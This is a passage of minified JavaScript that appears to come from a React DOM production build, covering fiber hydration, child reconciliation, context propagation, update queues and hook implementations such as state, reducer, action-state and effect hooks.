t=e.stateNode,a=e.type,l=e.memoizedProps;switch(t[F]=e,t[de]=l,a){case"dialog":he("cancel",t),he("close",t);break;case"iframe":case"object":case"embed":he("load",t);break;case"video":case"audio":for(a=0;a<Kn.length;a++)he(Kn[a],t);break;case"source":he("error",t);break;case"img":case"image":case"link":he("error",t),he("load",t);break;case"details":he("toggle",t);break;case"input":he("invalid",t),po(t,l.value,l.defaultValue,l.checked,l.defaultChecked,l.type,l.name,!0);break;case"select":he("invalid",t);break;case"textarea":he("invalid",t),go(t,l.value,l.defaultValue,l.children)}a=l.children,typeof a!="string"&&typeof a!="number"&&typeof a!="bigint"||t.textContent===""+a||l.suppressHydrationWarning===!0||bf(t.textContent,a)?(l.popover!=null&&(he("beforetoggle",t),he("toggle",t)),l.onScroll!=null&&he("scroll",t),l.onScrollEnd!=null&&he("scrollend",t),l.onClick!=null&&(t.onclick=ua),t=!0):t=!1,t||Oa(e,!0)}function lr(e){for(ct=e.return;ct;)switch(ct.tag){case 5:case 31:case 13:qt=!1;return;case 27:case 3:qt=!0;return;default:ct=ct.return}}function Ul(e){if(e!==ct)return!1;if(!ge)return lr(e),ge=!0,!1;var t=e.tag,a;if((a=t!==3&&t!==27)&&((a=t===5)&&(a=e.type,a=!(a!=="form"&&a!=="button")||Ou(e.type,e.memoizedProps)),a=!a),a&&He&&Oa(e),lr(e),t===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(m(317));He=Of(e)}else if(t===31){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(m(317));He=Of(e)}else t===27?(t=He,Va(e.type)?(e=_u,_u=null,He=e):He=t):He=ct?Vt(e.stateNode.nextSibling):null;return!0}function sl(){He=ct=null,ge=!1}function fc(){var e=wa;return e!==null&&(Nt===null?Nt=e:Nt.push.apply(Nt,e),wa=null),e}function Cn(e){wa===null?wa=[e]:wa.push(e)}var hc=d(null),cl=null,fa=null;function za(e,t,a){z(hc,t._currentValue),t._currentValue=a}function ha(e){e._currentValue=hc.current,T(hc)}function mc(e,t,a){for(;e!==null;){var l=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,l!==null&&(l.childLanes|=t)):l!==null&&(l.childLanes&t)!==t&&(l.childLanes|=t),e===a)break;e=e.return}}function pc(e,t,a,l){var n=e.child;for(n!==null&&(n.return=e);n!==null;){var i=n.dependencies;if(i!==null){var c=n.child;i=i.firstContext;e:for(;i!==null;){var u=i;i=n;for(var r=0;r<t.length;r++)if(u.context===t[r]){i.lanes|=a,u=i.alternate,u!==null&&(u.lanes|=a),mc(i.return,a,e),l||(c=null);break e}i=u.next}}else if(n.tag===18){if(c=n.return,c===null)throw Error(m(341));c.lanes|=a,i=c.alternate,i!==null&&(i.lanes|=a),mc(c,a,e),c=null}else c=n.child;if(c!==null)c.return=n;else for(c=n;c!==null;){if(c===e){c=null;break}if(n=c.sibling,n!==null){n.return=c.return,c=n;break}c=c.return}n=c}}function Bl(e,t,a,l){e=null;for(var n=t,i=!1;n!==null;){if(!i){if((n.flags&524288)!==0)i=!0;else if((n.flags&262144)!==0)break}if(n.tag===10){var c=n.alternate;if(c===null)throw Error(m(387));if(c=c.memoizedProps,c!==null){var u=n.type;Et(n.pendingProps.value,c.value)||(e!==null?e.push(u):e=[u])}}else if(n===re.current){if(c=n.alternate,c===null)throw Error(m(387));c.memoizedState.memoizedState!==n.memoizedState.memoizedState&&(e!==null?e.push($n):e=[$n])}n=n.return}e!==null&&pc(t,e,a,l),t.flags|=262144}function ki(e){for(e=e.firstContext;e!==null;){if(!Et(e.context._currentValue,e.memoizedValue))return!0;e=e.next}return!1}function ul(e){cl=e,fa=null,e=e.dependencies,e!==null&&(e.firstContext=null)}function ut(e){return nr(cl,e)}function Mi(e,t){return cl===null&&ul(e),nr(e,t)}function nr(e,t){var a=t._currentValue;if(t={context:t,memoizedValue:a,next:null},fa===null){if(e===null)throw Error(m(308));fa=t,e.dependencies={lanes:0,firstContext:t},e.flags|=524288}else fa=fa.next=t;return a}var vm=typeof AbortController<"u"?AbortController:function(){var e=[],t=this.signal={aborted:!1,addEventListener:function(a,l){e.push(l)}};this.abort=function(){t.aborted=!0,e.forEach(function(a){return a()})}},Sm=w.unstable_scheduleCallback,bm=w.unstable_NormalPriority,Je={$$typeof:G,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function yc(){return{controller:new vm,data:new Map,refCount:0}}function jn(e){e.refCount--,e.refCount===0&&Sm(bm,function(){e.controller.abort()})}var An=null,gc=0,Yl=0,ql=null;function xm(e,t){if(An===null){var a=An=[];gc=0,Yl=bu(),ql={status:"pending",value:void 0,then:function(l){a.push(l)}}}return gc++,t.then(ir,ir),t}function ir(){if(--gc===0&&An!==null){ql!==null&&(ql.status="fulfilled");var e=An;An=null,Yl=0,ql=null;for(var t=0;t<e.length;t++)(0,e[t])()}}function Tm(e,t){var a=[],l={status:"pending",value:null,reason:null,then:function(n){a.push(n)}};return e.then(function(){l.status="fulfilled",l.value=t;for(var n=0;n<a.length;n++)(0,a[n])(t)},function(n){for(l.status="rejected",l.reason=n,n=0;n<a.length;n++)(0,a[n])(void 0)}),l}var sr=b.S;b.S=function(e,t){Vd=pt(),typeof t=="object"&&t!==null&&typeof t.then=="function"&&xm(e,t),sr!==null&&sr(e,t)};var ol=d(null);function vc(){var e=ol.current;return e!==null?e:ke.pooledCache}function Di(e,t){t===null?z(ol,ol.current):z(ol,t.pool)}function cr(){var e=vc();return e===null?null:{parent:Je._currentValue,pool:e}}var Gl=Error(m(460)),Sc=Error(m(474)),_i=Error(m(542)),Hi={then:function(){}};function ur(e){return e=e.status,e==="fulfilled"||e==="rejected"}function or(e,t,a){switch(a=e[a],a===void 0?e.push(t):a!==t&&(t.then(ua,ua),t=a),t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,dr(e),e;default:if(typeof t.status=="string")t.then(ua,ua);else{if(e=ke,e!==null&&100<e.shellSuspendCounter)throw Error(m(482));e=t,e.status="pending",e.then(function(l){if(t.status==="pending"){var n=t;n.status="fulfilled",n.value=l}},function(l){if(t.status==="pending"){var n=t;n.status="rejected",n.reason=l}})}switch(t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,dr(e),e}throw dl=t,Gl}}function rl(e){try{var t=e._init;return t(e._payload)}catch(a){throw a!==null&&typeof a=="object"&&typeof a.then=="function"?(dl=a,Gl):a}}var dl=null;function rr(){if(dl===null)throw Error(m(459));var e=dl;return dl=null,e}function dr(e){if(e===Gl||e===_i)throw Error(m(483))}var Vl=null,En=0;function Ri(e){var t=En;return En+=1,Vl===null&&(Vl=[]),or(Vl,e,t)}function wn(e,t){t=t.props.ref,e.ref=t!==void 0?t:null}function Li(e,t){throw t.$$typeof===Ne?Error(m(525)):(e=Object.prototype.toString.call(t),Error(m(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)))}function fr(e){function t(h,f){if(e){var p=h.deletions;p===null?(h.deletions=[f],h.flags|=16):p.push(f)}}function a(h,f){if(!e)return null;for(;f!==null;)t(h,f),f=f.sibling;return null}function l(h){for(var f=new Map;h!==null;)h.key!==null?f.set(h.key,h):f.set(h.index,h),h=h.sibling;return f}function n(h,f){return h=ra(h,f),h.index=0,h.sibling=null,h}function i(h,f,p){return h.index=p,e?(p=h.alternate,p!==null?(p=p.index,p<f?(h.flags|=67108866,f):p):(h.flags|=67108866,f)):(h.flags|=1048576,f)}function c(h){return e&&h.alternate===null&&(h.flags|=67108866),h}function u(h,f,p,C){return f===null||f.tag!==6?(f=cc(p,h.mode,C),f.return=h,f):(f=n(f,p),f.return=h,f)}function r(h,f,p,C){var K=p.type;return K===Ve?x(h,f,p.props.children,C,p.key):f!==null&&(f.elementType===K||typeof K=="object"&&K!==null&&K.$$typeof===_&&rl(K)===f.type)?(f=n(f,p.props),wn(f,p),f.return=h,f):(f=Oi(p.type,p.key,p.props,null,h.mode,C),wn(f,p),f.return=h,f)}function y(h,f,p,C){return f===null||f.tag!==4||f.stateNode.containerInfo!==p.containerInfo||f.stateNode.implementation!==p.implementation?(f=uc(p,h.mode,C),f.return=h,f):(f=n(f,p.children||[]),f.return=h,f)}function x(h,f,p,C,K){return f===null||f.tag!==7?(f=il(p,h.mode,C,K),f.return=h,f):(f=n(f,p),f.return=h,f)}function A(h,f,p){if(typeof f=="string"&&f!==""||typeof f=="number"||typeof f=="bigint")return f=cc(""+f,h.mode,p),f.return=h,f;if(typeof f=="object"&&f!==null){switch(f.$$typeof){case se:return p=Oi(f.type,f.key,f.props,null,h.mode,p),wn(p,f),p.return=h,p;case Ge:return f=uc(f,h.mode,p),f.return=h,f;case _:return f=rl(f),A(h,f,p)}if(Ce(f)||ye(f))return f=il(f,h.mode,p,null),f.return=h,f;if(typeof f.then=="function")return A(h,Ri(f),p);if(f.$$typeof===G)return A(h,Mi(h,f),p);Li(h,f)}return null}function g(h,f,p,C){var K=f!==null?f.key:null;if(typeof p=="string"&&p!==""||typeof p=="number"||typeof p=="bigint")return K!==null?null:u(h,f,""+p,C);if(typeof p=="object"&&p!==null){switch(p.$$typeof){case se:return p.key===K?r(h,f,p,C):null;case Ge:return p.key===K?y(h,f,p,C):null;case _:return p=rl(p),g(h,f,p,C)}if(Ce(p)||ye(p))return K!==null?null:x(h,f,p,C,null);if(typeof p.then=="function")return g(h,f,Ri(p),C);if(p.$$typeof===G)return g(h,f,Mi(h,p),C);Li(h,p)}return null}function v(h,f,p,C,K){if(typeof C=="string"&&C!==""||typeof C=="number"||typeof C=="bigint")return h=h.get(p)||null,u(f,h,""+C,K);if(typeof C=="object"&&C!==null){switch(C.$$typeof){case se:return h=h.get(C.key===null?p:C.key)||null,r(f,h,C,K);case Ge:return h=h.get(C.key===null?p:C.key)||null,y(f,h,C,K);case _:return C=rl(C),v(h,f,p,C,K)}if(Ce(C)||ye(C))return h=h.get(p)||null,x(f,h,C,K,null);if(typeof C.then=="function")return v(h,f,p,Ri(C),K);if(C.$$typeof===G)return v(h,f,p,Mi(f,C),K);Li(f,C)}return null}function U(h,f,p,C){for(var K=null,Se=null,Y=f,ne=f=0,pe=null;Y!==null&&ne<p.length;ne++){Y.index>ne?(pe=Y,Y=null):pe=Y.sibling;var be=g(h,Y,p[ne],C);if(be===null){Y===null&&(Y=pe);break}e&&Y&&be.alternate===null&&t(h,Y),f=i(be,f,ne),Se===null?K=be:Se.sibling=be,Se=be,Y=pe}if(ne===p.length)return a(h,Y),ge&&da(h,ne),K;if(Y===null){for(;ne<p.length;ne++)Y=A(h,p[ne],C),Y!==null&&(f=i(Y,f,ne),Se===null?K=Y:Se.sibling=Y,Se=Y);return ge&&da(h,ne),K}for(Y=l(Y);ne<p.length;ne++)pe=v(Y,h,ne,p[ne],C),pe!==null&&(e&&pe.alternate!==null&&Y.delete(pe.key===null?ne:pe.key),f=i(pe,f,ne),Se===null?K=pe:Se.sibling=pe,Se=pe);return e&&Y.forEach(function(Wa){return t(h,Wa)}),ge&&da(h,ne),K}function W(h,f,p,C){if(p==null)throw Error(m(151));for(var K=null,Se=null,Y=f,ne=f=0,pe=null,be=p.next();Y!==null&&!be.done;ne++,be=p.next()){Y.index>ne?(pe=Y,Y=null):pe=Y.sibling;var Wa=g(h,Y,be.value,C);if(Wa===null){Y===null&&(Y=pe);break}e&&Y&&Wa.alternate===null&&t(h,Y),f=i(Wa,f,ne),Se===null?K=Wa:Se.sibling=Wa,Se=Wa,Y=pe}if(be.done)return a(h,Y),ge&&da(h,ne),K;if(Y===null){for(;!be.done;ne++,be=p.next())be=A(h,be.value,C),be!==null&&(f=i(be,f,ne),Se===null?K=be:Se.sibling=be,Se=be);return ge&&da(h,ne),K}for(Y=l(Y);!be.done;ne++,be=p.next())be=v(Y,h,ne,be.value,C),be!==null&&(e&&be.alternate!==null&&Y.delete(be.key===null?ne:be.key),f=i(be,f,ne),Se===null?K=be:Se.sibling=be,Se=be);return e&&Y.forEach(function(Dp){return t(h,Dp)}),ge&&da(h,ne),K}function ze(h,f,p,C){if(typeof p=="object"&&p!==null&&p.type===Ve&&p.key===null&&(p=p.props.children),typeof p=="object"&&p!==null){switch(p.$$typeof){case se:e:{for(var K=p.key;f!==null;){if(f.key===K){if(K=p.type,K===Ve){if(f.tag===7){a(h,f.sibling),C=n(f,p.props.children),C.return=h,h=C;break e}}else if(f.elementType===K||typeof K=="object"&&K!==null&&K.$$typeof===_&&rl(K)===f.type){a(h,f.sibling),C=n(f,p.props),wn(C,p),C.return=h,h=C;break e}a(h,f);break}else t(h,f);f=f.sibling}p.type===Ve?(C=il(p.props.children,h.mode,C,p.key),C.return=h,h=C):(C=Oi(p.type,p.key,p.props,null,h.mode,C),wn(C,p),C.return=h,h=C)}return c(h);case Ge:e:{for(K=p.key;f!==null;){if(f.key===K)if(f.tag===4&&f.stateNode.containerInfo===p.containerInfo&&f.stateNode.implementation===p.implementation){a(h,f.sibling),C=n(f,p.children||[]),C.return=h,h=C;break e}else{a(h,f);break}else t(h,f);f=f.sibling}C=uc(p,h.mode,C),C.return=h,h=C}return c(h);case _:return p=rl(p),ze(h,f,p,C)}if(Ce(p))return U(h,f,p,C);if(ye(p)){if(K=ye(p),typeof K!="function")throw Error(m(150));return p=K.call(p),W(h,f,p,C)}if(typeof p.then=="function")return ze(h,f,Ri(p),C);if(p.$$typeof===G)return ze(h,f,Mi(h,p),C);Li(h,p)}return typeof p=="string"&&p!==""||typeof p=="number"||typeof p=="bigint"?(p=""+p,f!==null&&f.tag===6?(a(h,f.sibling),C=n(f,p),C.return=h,h=C):(a(h,f),C=cc(p,h.mode,C),C.return=h,h=C),c(h)):a(h,f)}return function(h,f,p,C){try{En=0;var K=ze(h,f,p,C);return Vl=null,K}catch(Y){if(Y===Gl||Y===_i)throw Y;var Se=wt(29,Y,null,h.mode);return Se.lanes=C,Se.return=h,Se}}}var fl=fr(!0),hr=fr(!1),ka=!1;function bc(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function xc(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,callbacks:null})}function Ma(e){return{lane:e,tag:0,payload:null,callback:null,next:null}}function Da(e,t,a){var l=e.updateQueue;if(l===null)return null;if(l=l.shared,(Te&2)!==0){var n=l.pending;return n===null?t.next=t:(t.next=n.next,n.next=t),l.pending=t,t=wi(e),Fo(e,null,a),t}return Ei(e,l,t,a),wi(e)}function On(e,t,a){if(t=t.updateQueue,t!==null&&(t=t.shared,(a&4194048)!==0)){var l=t.lanes;l&=e.pendingLanes,a|=l,t.lanes=a,hi(e,a)}}function Tc(e,t){var a=e.updateQueue,l=e.alternate;if(l!==null&&(l=l.updateQueue,a===l)){var n=null,i=null;if(a=a.firstBaseUpdate,a!==null){do{var c={lane:a.lane,tag:a.tag,payload:a.payload,callback:null,next:null};i===null?n=i=c:i=i.next=c,a=a.next}while(a!==null);i===null?n=i=t:i=i.next=t}else n=i=t;a={baseState:l.baseState,firstBaseUpdate:n,lastBaseUpdate:i,shared:l.shared,callbacks:l.callbacks},e.updateQueue=a;return}e=a.lastBaseUpdate,e===null?a.firstBaseUpdate=t:e.next=t,a.lastBaseUpdate=t}var Nc=!1;function zn(){if(Nc){var e=ql;if(e!==null)throw e}}function kn(e,t,a,l){Nc=!1;var n=e.updateQueue;ka=!1;var i=n.firstBaseUpdate,c=n.lastBaseUpdate,u=n.shared.pending;if(u!==null){n.shared.pending=null;var r=u,y=r.next;r.next=null,c===null?i=y:c.next=y,c=r;var x=e.alternate;x!==null&&(x=x.updateQueue,u=x.lastBaseUpdate,u!==c&&(u===null?x.firstBaseUpdate=y:u.next=y,x.lastBaseUpdate=r))}if(i!==null){var A=n.baseState;c=0,x=y=r=null,u=i;do{var g=u.lane&-536870913,v=g!==u.lane;if(v?(me&g)===g:(l&g)===g){g!==0&&g===Yl&&(Nc=!0),x!==null&&(x=x.next={lane:0,tag:u.tag,payload:u.payload,callback:null,next:null});e:{var U=e,W=u;g=t;var ze=a;switch(W.tag){case 1:if(U=W.payload,typeof U=="function"){A=U.call(ze,A,g);break e}A=U;break e;case 3:U.flags=U.flags&-65537|128;case 0:if(U=W.payload,g=typeof U=="function"?U.call(ze,A,g):U,g==null)break e;A=Q({},A,g);break e;case 2:ka=!0}}g=u.callback,g!==null&&(e.flags|=64,v&&(e.flags|=8192),v=n.callbacks,v===null?n.callbacks=[g]:v.push(g))}else v={lane:g,tag:u.tag,payload:u.payload,callback:u.callback,next:null},x===null?(y=x=v,r=A):x=x.next=v,c|=g;if(u=u.next,u===null){if(u=n.shared.pending,u===null)break;v=u,u=v.next,v.next=null,n.lastBaseUpdate=v,n.shared.pending=null}}while(!0);x===null&&(r=A),n.baseState=r,n.firstBaseUpdate=y,n.lastBaseUpdate=x,i===null&&(n.shared.lanes=0),Ua|=c,e.lanes=c,e.memoizedState=A}}function mr(e,t){if(typeof e!="function")throw Error(m(191,e));e.call(t)}function pr(e,t){var a=e.callbacks;if(a!==null)for(e.callbacks=null,e=0;e<a.length;e++)mr(a[e],t)}var Xl=d(null),Ui=d(0);function yr(e,t){e=Ta,z(Ui,e),z(Xl,t),Ta=e|t.baseLanes}function Cc(){z(Ui,Ta),z(Xl,Xl.current)}function jc(){Ta=Ui.current,T(Xl),T(Ui)}var Ot=d(null),Gt=null;function _a(e){var t=e.alternate;z(Qe,Qe.current&1),z(Ot,e),Gt===null&&(t===null||Xl.current!==null||t.memoizedState!==null)&&(Gt=e)}function Ac(e){z(Qe,Qe.current),z(Ot,e),Gt===null&&(Gt=e)}function gr(e){e.tag===22?(z(Qe,Qe.current),z(Ot,e),Gt===null&&(Gt=e)):Ha()}function Ha(){z(Qe,Qe.current),z(Ot,Ot.current)}function zt(e){T(Ot),Gt===e&&(Gt=null),T(Qe)}var Qe=d(0);function Bi(e){for(var t=e;t!==null;){if(t.tag===13){var a=t.memoizedState;if(a!==null&&(a=a.dehydrated,a===null||Mu(a)||Du(a)))return t}else if(t.tag===19&&(t.memoizedProps.revealOrder==="forwards"||t.memoizedProps.revealOrder==="backwards"||t.memoizedProps.revealOrder==="unstable_legacy-backwards"||t.memoizedProps.revealOrder==="together")){if((t.flags&128)!==0)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var ma=0,le=null,we=null,Fe=null,Yi=!1,Ql=!1,hl=!1,qi=0,Mn=0,Kl=null,Nm=0;function Ye(){throw Error(m(321))}function Ec(e,t){if(t===null)return!1;for(var a=0;a<t.length&&a<e.length;a++)if(!Et(e[a],t[a]))return!1;return!0}function wc(e,t,a,l,n,i){return ma=i,le=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,b.H=e===null||e.memoizedState===null?ed:Vc,hl=!1,i=a(l,n),hl=!1,Ql&&(i=Sr(t,a,l,n)),vr(e),i}function vr(e){b.H=Hn;var t=we!==null&&we.next!==null;if(ma=0,Fe=we=le=null,Yi=!1,Mn=0,Kl=null,t)throw Error(m(300));e===null||$e||(e=e.dependencies,e!==null&&ki(e)&&($e=!0))}function Sr(e,t,a,l){le=e;var n=0;do{if(Ql&&(Kl=null),Mn=0,Ql=!1,25<=n)throw Error(m(301));if(n+=1,Fe=we=null,e.updateQueue!=null){var i=e.updateQueue;i.lastEffect=null,i.events=null,i.stores=null,i.memoCache!=null&&(i.memoCache.index=0)}b.H=td,i=t(a,l)}while(Ql);return i}function Cm(){var e=b.H,t=e.useState()[0];return t=typeof t.then=="function"?Dn(t):t,e=e.useState()[0],(we!==null?we.memoizedState:null)!==e&&(le.flags|=1024),t}function Oc(){var e=qi!==0;return qi=0,e}function zc(e,t,a){t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~a}function kc(e){if(Yi){for(e=e.memoizedState;e!==null;){var t=e.queue;t!==null&&(t.pending=null),e=e.next}Yi=!1}ma=0,Fe=we=le=null,Ql=!1,Mn=qi=0,Kl=null}function vt(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Fe===null?le.memoizedState=Fe=e:Fe=Fe.next=e,Fe}function Ke(){if(we===null){var e=le.alternate;e=e!==null?e.memoizedState:null}else e=we.next;var t=Fe===null?le.memoizedState:Fe.next;if(t!==null)Fe=t,we=e;else{if(e===null)throw le.alternate===null?Error(m(467)):Error(m(310));we=e,e={memoizedState:we.memoizedState,baseState:we.baseState,baseQueue:we.baseQueue,queue:we.queue,next:null},Fe===null?le.memoizedState=Fe=e:Fe=Fe.next=e}return Fe}function Gi(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function Dn(e){var t=Mn;return Mn+=1,Kl===null&&(Kl=[]),e=or(Kl,e,t),t=le,(Fe===null?t.memoizedState:Fe.next)===null&&(t=t.alternate,b.H=t===null||t.memoizedState===null?ed:Vc),e}function Vi(e){if(e!==null&&typeof e=="object"){if(typeof e.then=="function")return Dn(e);if(e.$$typeof===G)return ut(e)}throw Error(m(438,String(e)))}function Mc(e){var t=null,a=le.updateQueue;if(a!==null&&(t=a.memoCache),t==null){var l=le.alternate;l!==null&&(l=l.updateQueue,l!==null&&(l=l.memoCache,l!=null&&(t={data:l.data.map(function(n){return n.slice()}),index:0})))}if(t==null&&(t={data:[],index:0}),a===null&&(a=Gi(),le.updateQueue=a),a.memoCache=t,a=t.data[t.index],a===void 0)for(a=t.data[t.index]=Array(e),l=0;l<e;l++)a[l]=_e;return t.index++,a}function pa(e,t){return typeof t=="function"?t(e):t}function Xi(e){var t=Ke();return Dc(t,we,e)}function Dc(e,t,a){var l=e.queue;if(l===null)throw Error(m(311));l.lastRenderedReducer=a;var n=e.baseQueue,i=l.pending;if(i!==null){if(n!==null){var c=n.next;n.next=i.next,i.next=c}t.baseQueue=n=i,l.pending=null}if(i=e.baseState,n===null)e.memoizedState=i;else{t=n.next;var u=c=null,r=null,y=t,x=!1;do{var A=y.lane&-536870913;if(A!==y.lane?(me&A)===A:(ma&A)===A){var g=y.revertLane;if(g===0)r!==null&&(r=r.next={lane:0,revertLane:0,gesture:null,action:y.action,hasEagerState:y.hasEagerState,eagerState:y.eagerState,next:null}),A===Yl&&(x=!0);else if((ma&g)===g){y=y.next,g===Yl&&(x=!0);continue}else A={lane:0,revertLane:y.revertLane,gesture:null,action:y.action,hasEagerState:y.hasEagerState,eagerState:y.eagerState,next:null},r===null?(u=r=A,c=i):r=r.next=A,le.lanes|=g,Ua|=g;A=y.action,hl&&a(i,A),i=y.hasEagerState?y.eagerState:a(i,A)}else g={lane:A,revertLane:y.revertLane,gesture:y.gesture,action:y.action,hasEagerState:y.hasEagerState,eagerState:y.eagerState,next:null},r===null?(u=r=g,c=i):r=r.next=g,le.lanes|=A,Ua|=A;y=y.next}while(y!==null&&y!==t);if(r===null?c=i:r.next=u,!Et(i,e.memoizedState)&&($e=!0,x&&(a=ql,a!==null)))throw a;e.memoizedState=i,e.baseState=c,e.baseQueue=r,l.lastRenderedState=i}return n===null&&(l.lanes=0),[e.memoizedState,l.dispatch]}function _c(e){var t=Ke(),a=t.queue;if(a===null)throw Error(m(311));a.lastRenderedReducer=e;var l=a.dispatch,n=a.pending,i=t.memoizedState;if(n!==null){a.pending=null;var c=n=n.next;do i=e(i,c.action),c=c.next;while(c!==n);Et(i,t.memoizedState)||($e=!0),t.memoizedState=i,t.baseQueue===null&&(t.baseState=i),a.lastRenderedState=i}return[i,l]}function br(e,t,a){var l=le,n=Ke(),i=ge;if(i){if(a===void 0)throw Error(m(407));a=a()}else a=t();var c=!Et((we||n).memoizedState,a);if(c&&(n.memoizedState=a,$e=!0),n=n.queue,Lc(Nr.bind(null,l,n,e),[e]),n.getSnapshot!==t||c||Fe!==null&&Fe.memoizedState.tag&1){if(l.flags|=2048,Zl(9,{destroy:void 0},Tr.bind(null,l,n,a,t),null),ke===null)throw Error(m(349));i||(ma&127)!==0||xr(l,t,a)}return a}function xr(e,t,a){e.flags|=16384,e={getSnapshot:t,value:a},t=le.updateQueue,t===null?(t=Gi(),le.updateQueue=t,t.stores=[e]):(a=t.stores,a===null?t.stores=[e]:a.push(e))}function Tr(e,t,a,l){t.value=a,t.getSnapshot=l,Cr(t)&&jr(e)}function Nr(e,t,a){return a(function(){Cr(t)&&jr(e)})}function Cr(e){var t=e.getSnapshot;e=e.value;try{var a=t();return!Et(e,a)}catch{return!0}}function jr(e){var t=nl(e,2);t!==null&&Ct(t,e,2)}function Hc(e){var t=vt();if(typeof e=="function"){var a=e;if(e=a(),hl){Ft(!0);try{a()}finally{Ft(!1)}}}return t.memoizedState=t.baseState=e,t.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:pa,lastRenderedState:e},t}function Ar(e,t,a,l){return e.baseState=a,Dc(e,we,typeof l=="function"?l:pa)}function jm(e,t,a,l,n){if(Zi(e))throw Error(m(485));if(e=t.action,e!==null){var i={payload:n,action:e,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(c){i.listeners.push(c)}};b.T!==null?a(!0):i.isTransition=!1,l(i),a=t.pending,a===null?(i.next=t.pending=i,Er(t,i)):(i.next=a.next,t.pending=a.next=i)}}function Er(e,t){var a=t.action,l=t.payload,n=e.state;if(t.isTransition){var i=b.T,c={};b.T=c;try{var u=a(n,l),r=b.S;r!==null&&r(c,u),wr(e,t,u)}catch(y){Rc(e,t,y)}finally{i!==null&&c.types!==null&&(i.types=c.types),b.T=i}}else try{i=a(n,l),wr(e,t,i)}catch(y){Rc(e,t,y)}}function wr(e,t,a){a!==null&&typeof a=="object"&&typeof a.then=="function"?a.then(function(l){Or(e,t,l)},function(l){return Rc(e,t,l)}):Or(e,t,a)}function Or(e,t,a){t.status="fulfilled",t.value=a,zr(t),e.state=a,t=e.pending,t!==null&&(a=t.next,a===t?e.pending=null:(a=a.next,t.next=a,Er(e,a)))}function Rc(e,t,a){var l=e.pending;if(e.pending=null,l!==null){l=l.next;do t.status="rejected",t.reason=a,zr(t),t=t.next;while(t!==l)}e.action=null}function zr(e){e=e.listeners;for(var t=0;t<e.length;t++)(0,e[t])()}function kr(e,t){return t}function Mr(e,t){if(ge){var a=ke.formState;if(a!==null){e:{var l=le;if(ge){if(He){t:{for(var n=He,i=qt;n.nodeType!==8;){if(!i){n=null;break t}if(n=Vt(n.nextSibling),n===null){n=null;break t}}i=n.data,n=i==="F!"||i==="F"?n:null}if(n){He=Vt(n.nextSibling),l=n.data==="F!";break e}}Oa(l)}l=!1}l&&(t=a[0])}}return a=vt(),a.memoizedState=a.baseState=t,l={pending:null,lanes:0,dispatch:null,lastRenderedReducer:kr,lastRenderedState:t},a.queue=l,a=$r.bind(null,le,l),l.dispatch=a,l=Hc(!1),i=Gc.bind(null,le,!1,l.queue),l=vt(),n={state:t,dispatch:null,action:e,pending:null},l.queue=n,a=jm.bind(null,le,n,i,a),n.dispatch=a,l.memoizedState=e,[t,a,!1]}function Dr(e){var t=Ke();return _r(t,we,e)}function _r(e,t,a){if(t=Dc(e,t,kr)[0],e=Xi(pa)[0],typeof t=="object"&&t!==null&&typeof t.then=="function")try{var l=Dn(t)}catch(c){throw c===Gl?_i:c}else l=t;t=Ke();var n=t.queue,i=n.dispatch;return a!==t.memoizedState&&(le.flags|=2048,Zl(9,{destroy:void 0},Am.bind(null,n,a),null)),[l,i,e]}function Am(e,t){e.action=t}function Hr(e){var t=Ke(),a=we;if(a!==null)return _r(t,a,e);Ke(),t=t.memoizedState,a=Ke();var l=a.queue.dispatch;return a.memoizedState=e,[t,l,!1]}function Zl(e,t,a,l){return e={tag:e,create:a,deps:l,inst:t,next:null},t=le.updateQueue,t===null&&(t=Gi(),le.updateQueue=t),a=t.lastEffect,a===null?t.lastEffect=e.next=e:(l=a.next,a.next=e,e.next=l,t.lastEffect=e),e}function Rr(){return Ke().memoizedState}function Qi(e,t,a,l){var n=vt();le.flags|=e,n.memoizedState=Zl(1|t,{destroy:void 0},a,l===void 0?null:l)}function Ki(e,t,a,l){var n=Ke();l=l===void 0?null:l;var i=n.memoizedState.inst;we!==null&&l!==null&&Ec(l,we.memoizedState.deps)?n.memoizedState=Zl(t,i,a,l):(le.flags|=e,n.memoizedState=Zl(1|t,i,a,l))}function Lr(e,t){Qi(8390656,8,e,t)}function Lc(e,t){Ki(2048,8,e,t)}function Em(e){le.flags|=4;var t=le.updateQueue;if(t===null)t=Gi(),le.updateQueue=t,t.events=[e];else{var a=t.events;a===null?t.events=[e]:a.push(e)}}function Ur(e){var t=Ke().memoizedState;return Em({ref:t,nextImpl:e}),function(){if((Te&2)!==0)throw Error(m(440));return t.impl.apply(void 0,arguments)}}function Br(e,t){return Ki(4,2,e,t)}function Yr(e,t){return Ki(4,4,e,t)}function qr(e,t){if(typeof t=="function"){e=e();var a=t(e);return function(){typeof a=="function"?a():t(null)}}if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function Gr(e,t,a){a=a!=null?a.concat([e]):null,Ki(4,4,qr.bind(null,t,e),a)}function Uc(){}function Vr(e,t){var a=Ke();t=t===void 0?null:t;var l=a.memoizedState;return t!==null&&Ec(t,l[1])?l[0]:(a.memoizedState=[e,t],e)}function Xr(e,t){var a=Ke();t=t===void 0?null:t;var l=a.memoizedState;if(t!==null&&Ec(t,l[1]))return l[0];if(l=e(),hl){Ft(!0);try{e()}finally{Ft(!1)}}return a.memoizedState=[l,t],l}function Bc(e,t,a){return a===void 